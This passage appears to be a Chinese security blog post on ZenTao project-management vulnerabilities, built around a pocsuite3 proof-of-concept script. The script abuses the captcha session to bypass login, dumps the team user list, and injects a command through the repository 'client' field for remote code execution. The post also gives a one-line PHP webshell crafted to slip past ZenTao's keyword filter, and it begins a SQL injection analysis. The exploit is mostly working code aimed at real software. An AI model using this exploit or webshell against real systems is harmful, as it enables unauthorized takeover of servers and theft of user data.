<h3 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h3><p><img src="D:\文档\分析\img\1679578008273-a59de053-876a-4e26-8487-60f5ff4cf64e.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="D:\文档\分析\img\1679578038199-f97336cf-76ff-4a0e-aa1b-5e3bfb4d4427.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> pocsuite3.api <span class="hljs-keyword">import</span> Output, POCBase, register_poc, requests, logger, OptString<br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> OrderedDict<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DemoPOC</span>(<span class="hljs-title class_ inherited__">POCBase</span>):<br>    vulID = <span class="hljs-string">&quot;xxxx&quot;</span>  <span class="hljs-comment"># ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0</span><br>    version = <span class="hljs-string">&quot;1&quot;</span>  <span class="hljs-comment"># 默认为1</span><br>    author = <span class="hljs-string">&quot;spike&quot;</span>  <span class="hljs-comment"># PoC作者的大名</span><br>    vulDate = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 漏洞公开的时间,不知道就写今天</span><br>    createDate = <span class="hljs-string">&quot;2022-07-17&quot;</span>  <span class="hljs-comment"># 编写 PoC 的日期</span><br>    updateDate = <span class="hljs-string">&quot;2022-07-17&quot;</span>  <span class="hljs-comment"># PoC 更新的时间,默认和编写时间一样</span><br>    references = [<span class="hljs-string">&quot;https://xxx.xx.com.cn&quot;</span>]  <span class="hljs-comment"># 漏洞地址来源,0day不用写</span><br>    name = <span class="hljs-string">&quot;禅道后台任意文件上传 upload&quot;</span>  <span class="hljs-comment"># PoC 名称</span><br>    appPowerLink = <span class="hljs-string">&quot;https://www.zentao.net/&quot;</span>  <span class="hljs-comment"># 漏洞厂商主页地址</span><br>    appName = <span class="hljs-string">&quot;zentao&quot;</span>  <span class="hljs-comment"># 漏洞应用名称</span><br>    appVersion = <span class="hljs-string">&quot;...&quot;</span>  <span class="hljs-comment"># 漏洞影响版本</span><br>    vulType = <span class="hljs-string">&#x27;File Upload&#x27;</span>  <span class="hljs-comment"># 漏洞类型,类型参考见 漏洞类型规范表</span><br>    samples = [<span class="hljs-string">&#x27;&#x27;</span>]  <span class="hljs-comment"># 测试样列,就是用 PoC 测试成功的网站</span><br>    install_requires = [<span class="hljs-string">&#x27;&#x27;</span>]  <span class="hljs-comment"># PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写</span><br>    <br>    <br>    <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_options</span>(<span class="hljs-params">self</span>):<br>        o = OrderedDict()<br>        o[<span class="hljs-string">&quot;cmd&quot;</span>] = OptString(<span class="hljs-string">&#x27;clase&#x27;</span>, description=<span class="hljs-string">&#x27;要执行的php代码&#x27;</span>, require=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">return</span> o<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_exploit</span>(<span class="hljs-params">self, param=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._check(dork=<span class="hljs-string">&#x27;&#x27;</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span><br>        &#125;<br><br>        session = requests.session()<br>        captcha_url = <span class="hljs-string">&#x27;/www/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;</span><br>        <span class="hljs-comment">#html_url = &#x27;/zentao/misc-captcha-user.html&#x27;</span><br>        my_url = <span class="hljs-string">&#x27;/www/index.php?m=my&amp;f=team&#x27;</span><br>        <span class="hljs-comment">#html_my_url = &#x27;/zentao/my-team.html&#x27;</span><br><br>        <span class="hljs-comment">#session_rep = session.get(url=self.url + captcha_url,headers=headers)</span><br>        session_rep = session.get(url=self.url + captcha_url, headers=headers)<br>        my_rep = session.get(url=self.url + my_url, headers=headers)<br><br><br>        logger.debug(my_rep)<br>        <span class="hljs-keyword">return</span> my_rep<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_verify</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        param = <span class="hljs-string">&#x27;&#x27;</span><br>        res = self._exploit(param)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;td class=&#x27;c-id&#x27;&quot;</span> <span class="hljs-keyword">in</span> res.text <span class="hljs-keyword">and</span> res.status_code == <span class="hljs-number">200</span>:<br>            c_id = re.findall(<span class="hljs-string">&quot;td class=&#x27;c-id&#x27;&gt;(.*?)&lt;/td&gt;&quot;</span>,res.text)<br>            user = re.findall(<span class="hljs-string">&quot;&lt;td&gt;(.*?)&lt;/td&gt;&quot;</span>, res.text)<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = self.url<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;id&#x27;</span>] = c_id<br>            result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;user&#x27;</span>] = user<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_attack</span>(<span class="hljs-params">self</span>):<br>        result = &#123;&#125;<br>        common = self.get_option(<span class="hljs-string">&#x27;cmd&#x27;</span>)<br>        url = self.url<br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span><br>        &#125;<br>        session = requests.session()<br>        captcha_url = <span class="hljs-string">&#x27;/www/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;</span><br>        captcha_rep = session.get(url=url + captcha_url,headers=headers)<br><br>        headers = &#123;<br>            <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36&#x27;</span>,<br>            <span class="hljs-string">&#x27;X-Requested-With&#x27;</span>: <span class="hljs-string">&#x27;XMLHttpRequest&#x27;</span>,<br>            <span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/x-www-form-urlencoded; charset=UTF-8&#x27;</span>,<br>            <span class="hljs-string">&#x27;Referer&#x27;</span>: url + <span class="hljs-string">&#x27;/www/index.php?m=repo&amp;f=create&amp;objectID=0&#x27;</span><br>        &#125;<br>        create_url = <span class="hljs-string">&#x27;/www/index.php?m=repo&amp;f=create&amp;objectID=0&#x27;</span><br><br>        data1 = <span class="hljs-string">&quot;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66666&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&quot;</span><br>        create_rep = session.post(url=self.url+create_url,data=data1,headers=headers);<br><br>        data2 = <span class="hljs-string">&quot;product[]=&amp;projects[]=&amp;SCM=Subversion&amp;serviceHost=&amp;name=q&amp;path=&amp;encoding=&amp;client=&quot;</span> + common +<span class="hljs-string">&quot;&amp;account=&amp;password=&amp;encrypt=&amp;acl[groups][]=1&amp;acl[users][]=&amp;desc=&amp;uid=&quot;</span><br>        exec_url = <span class="hljs-string">&#x27;/www/index.php?m=repo&amp;f=edit&amp;repoID=&amp;objectID=&#x27;</span><br><br>        exec_rep = session.post(url=url + exec_url,data=data2,headers=headers)<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>] = &#123;&#125;<br>        result[<span class="hljs-string">&#x27;VerifyInfo&#x27;</span>][<span class="hljs-string">&#x27;URL&#x27;</span>] = url<br>        <span class="hljs-keyword">return</span> self.parse_output(result)<br>                                <br>register_poc(DemoPOC)<br></code></pre></td></tr></table></figure>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>这里需要注意两个点：由于禅道采用的是MVC架构，所有它存在两种路由访问方法。<br>第一点：<br>第一种就是文章所写的由 <code>index.php</code>来调用模块、方法。<br>第二种就是伪静态路由&#x2F;<code>zentao/my-team.html</code>，<code>my</code>模块<code>team</code>方法来用进行调用。<br>所以需要自己来判断禅道的路由情况，来进行利用。<br>第二点：<br>此次RCE利用执行命令是无回显的，需要自己判断服务器状态，或者写入WebShell。<br>但是写入Webshell再禅道中有限制，再<code>fileterTrojan($var)</code>方法中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"> $evils    = array(<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;passthru&#x27;</span>, <span class="hljs-string">&#x27;proc_open&#x27;</span>, <span class="hljs-string">&#x27;shell_exec&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;$$&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>, <span class="hljs-string">&#x27;require&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>);<br>$replaces = array(<span class="hljs-string">&#x27;e v a l&#x27;</span>, <span class="hljs-string">&#x27;e x e c&#x27;</span>, <span class="hljs-string">&#x27;p a s s t h r u&#x27;</span>, <span class="hljs-string">&#x27;p r o c _ o p e n&#x27;</span>, <span class="hljs-string">&#x27;s h e l l _ e x e c&#x27;</span>, <span class="hljs-string">&#x27;s y s t e m&#x27;</span>, <span class="hljs-string">&#x27;$ $&#x27;</span>, <span class="hljs-string">&#x27;i n c l u d e&#x27;</span>, <span class="hljs-string">&#x27;r e q u i r e&#x27;</span>, <span class="hljs-string">&#x27;a s s e r t&#x27;</span>);<br>$var      = str_ireplace($evils, $replaces, $var);<br></code></pre></td></tr></table></figure>
<p>可以看到，一些关键词会被替换，无法正常执行命令，此时需要进行绕过。<br><img src="D:\文档\分析\img\1679659201942-418d4127-c957-494b-9162-2c92cb25d7da.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>上传文件，123.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_POST</span>[_](<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<br></code></pre></td></tr></table></figure>
<p><img src="D:\文档\分析\img\1679659311621-8a2eebf1-2d5a-4931-9552-70a28b2abb28.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>PHP高版本无法正常执行命令(system….)，PHP低版本可以正常执行。<br><img src="D:\文档\分析\img\1679659535655-3ac7de8c-1dee-486a-ab1d-a90bdf432161.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h3 id="漏洞挖掘（SQL注入）"><a href="#漏洞挖掘（SQL注入）" class="headerlink" title="漏洞挖掘（SQL注入）"></a>漏洞挖掘（SQL注入）</h3><p>注入漏洞1：<code>convert\model\dbExists</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">dbExists</span>(<span class="hljs-params"><span class="hljs-variable">$dbName</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SHOW DATABASES like &#x27;<span class="hljs-subst">&#123;$dbName&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;dbh-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>)-&gt;<span class="hljs-title function_ invoke__">fetch</span>();<br>    &#125;<br></code></pre></td></tr></table></figure>
<p>很简单的一个语句，搜索一下哪个方法调用了这个模块<br><img src="D:\文档\分析\img\1680683482500-9a9d0a05-4ed5-4fd0-a483-12c887a2802e.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="D:\文档\分析\img\1680683499164-8de2a94b-65f2-403b-af20-4a734fe99eb0.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>对应后台功能点<br><img src="D:\文档\分析\img\1680683527836-a48d117a-32f1-41c8-bfc1-74a7b180e156.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="D:\文档\分析\img\1680683589703-aaaef061-e969-4785-8e30-06dac6c7683d-170108868841153.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>
                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/Net/" class="category-chain-item">Net</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="print-no-link">#Web安全</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>禅道研发项目管理系统命令注</div>
      <div>http://example.com/2023/01/07/禅道漏洞/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>John Doe</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2023年1月7日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2023/03/13/%E7%95%85%E6%8D%B7%E9%80%9AT%E6%BC%8F%E6%B4%9E/" title="畅捷通漏洞">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">畅捷通漏洞</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/01/06/YApi%20_1.12.0%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="Yapi Rce">
                        <span class="hidden-mobile">Yapi Rce</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
